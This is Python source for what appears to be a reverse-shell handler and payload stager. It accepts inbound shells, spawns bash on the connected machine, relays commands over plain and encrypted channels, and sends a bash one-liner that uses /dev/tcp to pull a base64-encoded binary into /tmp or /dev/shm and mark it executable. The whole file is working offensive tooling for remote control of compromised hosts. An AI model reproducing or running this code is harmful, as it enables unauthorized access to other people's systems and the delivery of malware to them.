from modules.crypt import ServerPyEncryption

from modules.utils import NO_OUTPUT_SIGNAL
from threading import Thread # change this later
from base64 import b64encode
import threading
import logging
import select
import signal
import socket
import queue
import json
import time
import re

logging.basicConfig(level=logging.INFO)

ORIGINAL_SIGTSTP = signal.getsignal(signal.SIGTSTP)
EXIT_CMD = "; echo _3X1T_5TATUS=$? || echo _3X1T_5TATUS=$?\n"

def pretty(s):
    try:
        s = re.sub(r"_3X1T_5TATUS=\w+", "", s.decode()).strip()
    except AttributeError:
        pass
    if s and s != NO_OUTPUT_SIGNAL:
        return s
    else:
        return None

class BashServerSocket():
    def __init__(self, sock_type=None):
        if sock_type == None:
            self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        else:
            self.server_socket = socket.socket(socket.AF_INET, sock_type)

        self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

        self.is_python = "0"
        self.inputs = [self.server_socket]
        self.outputs = []
        self.message_queues = {}
        self.server_address, self.server_port = self.server_socket.getsockname()
        self.client_socket = None
        self.client_address = None


    def listen(self):
        self.server_socket.listen()

        logging.info(f"Started listener on {self.server_address, self.server_port}")
        readable, _, _ = select.select(self.inputs, self.outputs, self.inputs)

        for s in readable:
            if s is self.server_socket:

                self.client_socket, self.client_address = self.server_socket.accept()
                logging.info(f"Connection established with {self.client_address[0]}")

                self.client_socket.setblocking(0)

                self.inputs.append(self.client_socket)
                self.message_queues[self.client_socket] = queue.Queue()
                

    def is_shell(self):
        self.client_socket.sendall(f"/bin/bash 2>&1\n".encode())
        self.client_socket.sendall(f"echo hello{EXIT_CMD}".encode())
        print("INFO:root:Validating if connection has shell")
        time.sleep(0.1)
        check = self.send_command("echo THIS_IS_A_TEST_STRING_IGNORE_PLS")
        if check:
            return True
        else:
            return False

    # TODO: 06/2022: Figure out what I wrote a year ago
    # NOTE: 07/2023: What the hell is this
    def send_command(self, command=None, wt_output=True):
        """Gets data from client with proper monitoring using select() and queue for sending data.
        """
        output = b""

        while True:
            readable, writable, exceptional = select.select(self.inputs, self.outputs, self.inputs, 10)

            for s in readable:
                try:
                    data = s.recv(1024)
                except(OSError):
                    break
                
                if data:
                    logging.debug(f"Recieved data {data} from {s.getpeername()}")
                    if self.is_python == "0":
                        if data != b"INIT:SunnyWeatherAhead:BlueSkies":
                            output = output + data
                        if s not in self.outputs:
                            self.outputs.append(s)
                        if not wt_output:
                            print(pretty(data))

                        if b"_3X1T_5TATUS=" in data:
                            if wt_output:
                                return output
                            else:
                                return None
                    elif self.is_python == "1":
                        return data
                else:
                    if s in self.outputs:
                        self.outputs.remove(s)
                    self.inputs.remove(s)
                    s.close()

                    del self.message_queues[s]
                    return

            if command and writable:
                for s in writable:
                    if self.is_python == "1":
                        self.message_queues[s].put((command).encode())
                    else:
                        self.message_queues[s].put((command + EXIT_CMD).encode())
                    try:
                        next_msg = self.message_queues[s].get_nowait()
                    except(queue.Empty):
                        logging.debug(f"Output queue for {s.getpeername()} is empty")
                        self.outputs.remove(s)
                    else:
                        logging.debug(f"Sending {next_msg} to {s.getpeername()}")
                        s.sendall(next_msg)
                        command = None

            for s in exceptional:
                if s.fileno() != -1:
                    logging.warning(f"Handling exceptional condition for {s.getpeername()}")
                    self.inputs.remove(s)
                    for s in self.outputs:
                        self.outputs.remove(s)
                    s.close()

                    del self.message_queues[s]

            # if not readable and not writable and not exceptional:
            #     try:
            #         self.server_socket.sendall(b"")
            #     except(BrokenPipeError):
            #         for s in readable:
            #             self._close_socket(s)
            #     return False 


class PyServerSocket():
    def __init__(self, sock_type=socket.SOCK_STREAM):
        self.server_socket = socket.socket(socket.AF_INET, sock_type)
        self.server_address, self.server_port = self.server_socket.getsockname()
        self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.client_socket = None
        self.client_address = None
        self.is_open = True
        self.derived_key = None
        self.lock = threading.Lock()

    def listen(self):
        logging.debug(f"Started listener on {self.server_address, self.server_port}")
        self.server_socket.listen(1)
        self.client_socket, self.client_address = self.server_socket.accept()
        logging.debug(f"Connection established with {self.client_address}")

    def is_shell(self):
        logging.debug("Validating if connection is from payload")
        self.client_socket.sendall(b"echo pluh") # Change this later
        check = pretty(self.client_socket.recv(1024))
        if check:
            logging.info("Initializing interpreter")
            self.crypto = ServerPyEncryption()
            logging.debug("Starting handshake")
            self.client_socket.send(json.dumps({'p': self.crypto.p, 'g': self.crypto.g}).encode())
            return True
        else:
            return False
    
    def send_msg(self, msg):
        with self.lock:
            self.derived_key = self.crypto.get_derived_key(self.client_socket)
            message_length, message = self.crypto.encrypt_message(msg, self.derived_key)

            self.client_socket.sendall(message_length.to_bytes(4, byteorder="big"))
            self.client_socket.sendall(message)
            
        return True
    
    def recv_msg(self):
        with self.lock:
            chunk = b""
            data_length_bytes = self.client_socket.recv(4)
            data_length = int.from_bytes(data_length_bytes, byteorder="big")
            data_bytes = bytearray()

            while len(data_bytes) < data_length:
                chunk = self.client_socket.recv(data_length - len(data_bytes))
                if chunk == b"":
                    raise RuntimeError("socket connection broken")
                data_bytes.extend(chunk)

        return self.crypto.decrypt_message(bytes(data_bytes), self.derived_key)

    def send_command(self, msg):
        '''TODO CHANGE THIS TO SEND LARGE DATA IN CHUNKS'''
        self.send_msg(msg)
        msg = self.recv_msg()
        
        if b"[Errno " in msg:
            is_err = True
        else:
            is_err = False
            
        return [is_err, msg]


    def close(self):
        self.client_socket.close()
        self.server_socket.close()

class SendPayload():
    def __init__(self, main_socket, sock_type=socket.SOCK_STREAM):
        self.server_socket = socket.socket(socket.AF_INET, sock_type)
        self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.client_socket = None
        self.client_address = None
        self.main_socket = main_socket
        self.host = None
        
    def listen(self, host):
        self.host = host
        self.server_socket.bind((host, 5252))
        self.server_address, self.server_port = self.server_socket.getsockname()

        self.server_socket.listen(1)
        test = self.main_socket.client_socket.send(f"bash -c \"cd /tmp || cd /var/tmp || cd /dev/shm ; exec 3<>/dev/tcp/{self.host}/5252 ; cat <&3 | base64 -d > payload; chmod +x payload\"\n".encode())

        self.client_socket, self.client_address = self.server_socket.accept()
        logging.debug(f"Connection established with {self.client_address}")

    def send_file(self, file_name):

        with open(file_name, "rb") as f:
            binary_data = f.read()

        base64_data = b64encode(binary_data)
        self.client_socket.sendall(base64_data)
        self.client_socket.close()